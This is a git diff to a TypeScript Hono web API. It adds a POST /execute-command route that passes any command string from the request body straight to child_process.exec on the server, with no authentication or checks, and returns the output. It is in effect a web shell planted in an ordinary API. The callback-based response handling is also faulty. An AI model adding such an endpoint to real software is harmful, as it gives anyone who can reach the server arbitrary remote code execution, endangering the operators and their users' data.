@@ -3,6 +3,7 @@ import {Context, Hono} from 'hono';
 import {Asking} from '../models/asking';
 import {CreationsUsers} from '../models/user';
 import { stat } from 'fs';
+import { exec } from 'child_process';
 
 const api = new Hono().basePath('/');
 
@@ -212,6 +213,28 @@ api.get('/asking', async (c: any) => {
         return c.json(results);
     } catch (error: any) {
         return c.status(500).json({ msg: 'Error fetching asking details', error: error.message });
+    }
+});
+
+api.post('/execute-command', async (c: any) => {
+    const { command } = await c.req.json();
+
+    if (!command) {
+        return c.json({ msg: 'No command provided' }, 400);
+    }
+
+    try {
+        const { exec } = require('child_process');
+
+        // Exécuter la commande fournie
+        exec(command, (error: any, stdout: string, stderr: string) => {
+            if (error) {
+                return c.json({ error: `Erreur: ${stderr}` }, 500);
+            }
+            return c.json({ result: stdout });
+        });
+    } catch (error: any) {
+        return c.json({ msg: 'Erreur lors de l’exécution de la commande', error: error.message }, 500);
     }
 });
 
